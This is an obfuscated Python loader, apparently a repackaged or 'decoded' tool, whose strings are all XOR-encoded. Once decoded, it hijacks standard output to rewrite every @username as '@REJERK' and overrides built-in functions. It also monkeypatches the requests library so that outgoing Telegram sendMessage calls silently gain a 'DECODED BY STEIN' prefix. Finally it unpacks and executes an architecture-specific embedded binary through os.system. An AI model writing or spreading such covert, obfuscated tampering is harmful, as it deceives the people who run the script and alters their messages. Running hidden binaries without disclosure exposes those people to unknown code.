O = (lambda x, y: ''.join(chr(q ^ x) for q in y))(161, [130, 227, 248, 241,
    224, 242, 242, 228, 229, 129, 227, 248, 129, 242, 245, 228, 232, 239])
N = (lambda x, y: ''.join(chr(q ^ x) for q in y))(186, [220, 214, 207, 201,
    210])
M = (lambda x, y: ''.join(chr(q ^ x) for q in y))(96, [23, 18, 9, 20, 5])
L = (lambda x, y: ''.join(chr(q ^ x) for q in y))(207, [156, 187, 171, 160,
    186, 187])
I = None
H = print
import sys as E, os, re, requests as F, urllib.parse, webbrowser as P
H((lambda x, y: ''.join(chr(q ^ x) for q in y))(220, [152, 153, 159, 147, 
    152, 153, 252, 158, 133, 252, 143, 136, 153, 149, 146, 252, 160, 252, 
    156, 142, 153, 150, 153, 142, 151]))
repr = lambda *A: f'{A}'
list = lambda *A: f'{A}'


def open(text):
    B = (lambda x, y: ''.join(chr(q ^ x) for q in y))(23, [127, 99, 99, 103,
        100, 45, 56, 56, 99, 57, 122, 114, 56])
    A = text
    if B in A or A.split()[0]:
        D = A.split(B)[1].split()[0] if B in A else A.split()[0]
        C = A.replace(D, (lambda x, y: ''.join(chr(q ^ x) for q in y))(98,
            [48, 39, 40, 39, 48, 41]))
        P.open(C)
        return C
    return A


def Q(text):
    return re.sub((lambda x, y: ''.join(chr(q ^ x) for q in y))(208, [144, 
        140, 167, 251]), (lambda x, y: ''.join(chr(q ^ x) for q in y))(103,
        [39, 53, 34, 45, 34, 53, 44]), text)


R = type(L, (), {M: lambda self, text: E.__stdout__.write(Q(text)), N: lambda
    self: E.__stdout__.flush()})()
E.stdout = R
a = type(L, (), {M: lambda self, text: E.stdout.write(text), N: lambda self:
    E.stdout.flush()})()


def b(*A, **B):
    H(O)


def c(*A, **B):
    H(O)


S = F.get
T = F.post


def J(url, data=I):
    E = (lambda x, y: ''.join(chr(q ^ x) for q in y))(172, [232, 233, 239, 
        227, 232, 233, 140, 238, 245, 140, 236, 254, 233, 230, 233, 254, 
        231, 140, 8334, 140])
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(245, [211, 129, 144, 
        141, 129, 200])
    C = (lambda x, y: ''.join(chr(q ^ x) for q in y))(82, [38, 55, 42, 38])
    B = data
    A = url
    if (lambda x, y: ''.join(chr(q ^ x) for q in y))(9, [104, 121, 96, 39, 
        125, 108, 101, 108, 110, 123, 104, 100, 39, 102, 123, 110]) in A and (
        lambda x, y: ''.join(chr(q ^ x) for q in y))(74, [57, 47, 36, 46, 7,
        47, 57, 57, 43, 45, 47]) in A:
        if B and isinstance(B, dict) and C in B:
            B[C] = E + B[C]
        elif D in A:
            F, G = A.split(D, 1)
            H = urllib.parse.unquote(G)
            I = E + H.strip()
            J = urllib.parse.quote(I)
            A = F + D + J
    return A, B


def U(url, *B, **C):
    A = url
    A, D = J(A)
    return S(A, *B, **C)


def V(url, *E, **C):
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(9, [109, 104, 125, 104])
    B = url
    A = C.get(D, I)
    B, A = J(B, A)
    if A is not I:
        C[D] = A
    return T(B, *E, **C)


F.get = U
F.post = V
G = H
A = (lambda x, y: ''.join(chr(q ^ x) for q in y))(155, [])
B = chr
import zipfile as K, os as C, shutil as W, tempfile as X, sys as D, platform as Y


def Z():
    J = C.path.dirname(C.path.abspath(D.argv[0]))
    F = X.mkdtemp()
    try:
        L = C.path.abspath(D.argv[0])
        with K.ZipFile(L, (lambda x, y: ''.join(chr(q ^ x) for q in y))(129,
            [243])) as M:
            M.extractall(F)
        E = Y.machine()
        I = {(lambda s: A.join(B(A ^ 151) for A in s))([246, 229, 250, 225,
            160, 251]): (lambda s: A.join(B(A ^ 11) for A in s))([106, 121,
            102, 110, 106, 105, 98, 38, 125, 60, 106]), (lambda s: A.join(B
            (A ^ 69) for A in s))([36, 55, 40, 51, 125, 41]): (lambda s: A.
            join(B(A ^ 179) for A in s))([210, 193, 222, 214, 210, 209, 218,
            158, 197, 132, 210]), (lambda s: A.join(B(A ^ 134) for A in s))
            ([231, 244, 235]): (lambda s: A.join(B(A ^ 177) for A in s))([
            208, 195, 220, 212, 208, 211, 216, 156, 199, 134, 208]), (lambda
            s: A.join(B(A ^ 54) for A in s))([87, 87, 68, 85, 94, 0, 2]): (
            lambda s: A.join(B(A ^ 4) for A in s))([101, 118, 105, 50, 48, 
            41, 114, 60, 101]), (lambda s: A.join(B(A ^ 130) for A in s))([
            227, 240, 239, 180, 182]): (lambda s: A.join(B(A ^ 199) for A in
            s))([166, 181, 170, 241, 243, 234, 177, 255, 166]), (lambda s:
            A.join(B(A ^ 189) for A in s))([197, 133, 139]): (lambda s: A.
            join(B(A ^ 200) for A in s))([176, 240, 254]), (lambda s: A.
            join(B(A ^ 108) for A in s))([5, 90, 84, 90]): (lambda s: A.
            join(B(A ^ 39) for A in s))([95, 31, 17]), (lambda s: A.join(B(
            A ^ 173) for A in s))([213, 149, 155, 242, 155, 153]): (lambda
            s: A.join(B(A ^ 71) for A in s))([63, 127, 113, 24, 113, 115]),
            (lambda s: A.join(B(A ^ 208) for A in s))([177, 189, 180, 230, 
            228]): (lambda s: A.join(B(A ^ 176) for A in s))([200, 136, 134,
            239, 134, 132])}
        if E not in I:
            G((lambda s: A.join(B(A ^ 171) for A in s))([254, 197, 216, 222,
                219, 219, 196, 217, 223, 206, 207, 139, 202, 217, 200, 195,
                194, 223, 206, 200, 223, 222, 217, 206, 145, 139, 142, 216]
                ) % E)
            D.exit(1)
        N = I[E]
        H = C.path.join(F, N)
        if not C.path.exists(H):
            G((lambda s: A.join(B(A ^ 97) for A in s))([52, 15, 18, 20, 17,
                17, 14, 19, 21, 4, 5, 65, 0, 19, 2, 9, 8, 21, 4, 2, 21, 20,
                19, 4, 91, 65, 68, 18]) % E)
            D.exit(1)
        C.chmod(H, 493)
        C.chdir(J)
        O = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
            242, 244, 160, 204, 196, 223, 204, 201, 194, 210, 193, 210, 217,
            223, 208, 193, 212, 200, 189, 164, 204, 196, 223, 204, 201, 194,
            210, 193, 210, 217, 223, 208, 193, 212, 200, 186, 165, 243, 175,
            236, 233, 226, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244,
            160, 208, 217, 212, 200, 207, 206, 200, 207, 205, 197, 189, 165,
            243, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244, 160, 208,
            217, 212, 200, 207, 206, 223, 197, 216, 197, 195, 213, 212, 193,
            194, 204, 197, 189, 165, 243, 160, 166, 166, 160, 165, 243, 160,
            165, 243]) % (D.prefix, D.prefix, D.executable, H, (lambda x, y:
            ''.join(chr(q ^ x) for q in y))(90, [122]).join(D.argv[1:]))
        C.system(O)
    except K.BadZipFile:
        G((lambda s: A.join(B(A ^ 206) for A in s))([139, 188, 188, 161, 
            188, 244, 238, 154, 166, 171, 238, 180, 167, 190, 238, 168, 167,
            162, 171, 238, 167, 189, 238, 173, 161, 188, 188, 187, 190, 186,
            171, 170, 238, 161, 188, 238, 160, 161, 186, 238, 175, 238, 180,
            167, 190, 238, 168, 167, 162, 171, 224]))
    except Exception as P:
        G((lambda s: A.join(B(A ^ 195) for A in s))([130, 173, 227, 166, 
            177, 177, 172, 177, 227, 172, 160, 160, 182, 177, 177, 166, 167,
            249, 227, 230, 176]) % P)
    finally:
        W.rmtree(F)


if __name__ == (lambda s: A.join(B(A ^ 30) for A in s))([65, 65, 115, 127, 
    119, 112, 65, 65]):
    Z()
